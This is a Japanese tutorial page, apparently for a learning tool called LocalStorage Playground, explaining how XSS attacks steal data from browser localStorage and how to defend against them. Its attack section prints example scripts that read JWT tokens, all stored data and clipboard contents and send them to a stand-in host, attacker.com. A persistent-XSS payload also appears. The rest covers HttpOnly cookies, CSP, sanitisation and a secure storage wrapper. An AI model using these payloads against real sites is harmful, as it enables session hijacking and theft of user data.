# 🛡️ セキュリティリスクと対策

LocalStorage Playgroundで学習できるWebStorageのセキュリティ脅威と防御策について詳しく解説します。

---

## 🚨 XSSとlocalStorageの組み合わせ攻撃

### 攻撃シナリオ

#### 1. 基本的な攻撃パターン
```javascript
// XSS脆弱性を悪用して、localStorage内のトークンを盗む
<script>
  // JWTトークンの窃取
  const token = localStorage.getItem('jwt_token');
  const userData = localStorage.getItem('user_data');
  
  // 攻撃者のサーバーへ送信
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, userData }),
  });
</script>
```

#### 2. 全データ窃取攻撃
```javascript
// localStorage内の全データを一括で盗む
<script>
  const allData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    allData[key] = localStorage.getItem(key);
  }
  
  // Base64エンコードして送信
  const img = new Image();
  img.src = `https://attacker.com/collect?data=${btoa(JSON.stringify(allData))}`;
</script>
```

#### 3. 持続的攻撃（Persistent XSS）
```javascript
// localStorageにマルウェアを仕込む
<script>
  // 悪意のあるコードをlocalStorageに保存
  localStorage.setItem('app_config', JSON.stringify({
    apiUrl: 'https://attacker.com/api',
    tracking: '<img src=x onerror="alert(document.cookie)">'
  }));
  
  // アプリケーションがこのデータを信頼して使用すると...
  // 継続的にXSSが発生する
</script>
```

### 実際の被害例

| 攻撃タイプ | 被害内容 | 影響度 |
|-----------|---------|--------|
| **認証トークン窃取** | JWTやセッショントークンが盗まれ、なりすましログインが可能に | 🔴 重大 |
| **個人情報漏洩** | ユーザー設定、プロファイル情報、操作履歴などが流出 | 🔴 重大 |
| **アカウント乗っ取り** | 認証情報を使って完全にアカウントを制御される | 🔴 重大 |
| **データ改ざん** | localStorage内のデータを書き換えられ、アプリの動作が異常に | 🟡 中程度 |
| **マルウェア埋め込み** | 永続的な悪意のあるコードが仕込まれる | 🔴 重大 |

---

## 🔗 関連する攻撃手法

本ツールはlocalStorage/sessionStorageに焦点を当てていますが、実際のXSS攻撃では以下の手法と組み合わされることがあります：

### 📋 クリップボード攻撃
```javascript
// ユーザーがコピーした機密情報（パスワード、秘密鍵等）を窃取
const clipboardData = await navigator.clipboard.readText();
fetch('https://attacker.com/steal-clipboard', {
  method: 'POST',
  body: clipboardData
});
```

### 🍪 Cookie窃取
```javascript
// HttpOnlyでないCookieを窃取
document.cookie; // "sessionid=abc123; preferences=dark"
```

### 📱 デバイス情報収集
```javascript
// ブラウザー・OS・画面解像度等の情報収集
navigator.userAgent;
screen.width + "x" + screen.height;
```

### 🎯 複合攻撃の例
実際の攻撃では、localStorage/sessionStorage、Cookie、クリップボード、デバイス情報を**同時に窃取**して攻撃者サーバーに送信することで、より大きな被害をもたらします。

⚠️ **重要:** 本ツールはWebストレージのセキュリティリスクの学習に特化していますが、実際のセキュリティ対策では、これらの関連攻撃も含めた包括的な防御策が必要です。

---

## ✅ 推奨される対策

### 1. 機密情報はlocalStorageに保存しない
```javascript
// ❌ 悪い例
localStorage.setItem('auth_token', token);

// ✅ 良い例 - HttpOnly Cookieを使用
// サーバー側で設定:
// Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict
```

### 2. Content Security Policy (CSP) の実装
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 3. 入力値の適切なサニタイゼーション
```javascript
// DOMPurifyなどのライブラリを使用
const clean = DOMPurify.sanitize(userInput);
```

### 4. トークンの短期化と更新
```javascript
// トークンに有効期限を設定
const tokenData = {
  value: 'xxx',
  expires: Date.now() + (15 * 60 * 1000) // 15分
};
```

---

## 🛡️ セキュアな実装例

```javascript
// セキュアなストレージラッパーの実装
class SecureStorage {
  // 暗号化して保存（完全ではないが、単純な攻撃を防ぐ）
  static setItem(key, value, isPublic = false) {
    if (!isPublic && this.isSensitive(key)) {
      console.warn(`Warning: Storing potentially sensitive data in localStorage`);
      return false;
    }
    
    const data = {
      value: value,
      timestamp: Date.now(),
      checksum: this.generateChecksum(value)
    };
    
    localStorage.setItem(key, JSON.stringify(data));
  }
  
  // 改ざんチェック付きで取得
  static getItem(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    
    const data = JSON.parse(item);
    if (this.generateChecksum(data.value) !== data.checksum) {
      console.error('Data tampering detected!');
      localStorage.removeItem(key);
      return null;
    }
    
    return data.value;
  }
  
  static isSensitive(key) {
    const sensitivePatterns = ['token', 'password', 'secret', 'key', 'auth'];
    return sensitivePatterns.some(pattern => 
      key.toLowerCase().includes(pattern)
    );
  }
  
  static generateChecksum(value) {
    // 簡易的なチェックサム（本番環境では適切なハッシュ関数を使用）
    return btoa(JSON.stringify(value)).slice(-10);
  }
}
```

---

## ⚠️ 重要な注意点

- **localStorage/sessionStorageは、XSS攻撃に対して無防備です**
- **JWTトークンやAPIキーなどの機密情報は絶対に保存しないでください**
- **HttpOnly Cookieを使用することで、JavaScriptからのアクセスを防げます**
- **定期的なセキュリティ監査とペネトレーションテストを実施してください**

---

## 🎯 本ツールでの実践学習

LocalStorage Playgroundでは、これらの攻撃と防御策を実際に体験できます：

### 🔴 攻撃デモ
- 基本的な攻撃（トークン窃取、セッションデータ窃取）
- 高度な攻撃（全データ列挙、JSON一括取得）
- 持続的攻撃（マルウェア埋め込み、外部送信攻撃）

### 🛡️ 防御デモ
- CSP (Content Security Policy) の効果確認
- HttpOnly Cookieの防御力比較
- 入力サニタイゼーション前後の比較

👉 **[デモページで実際に試す](https://ipusiron.github.io/localstorage-playground/)**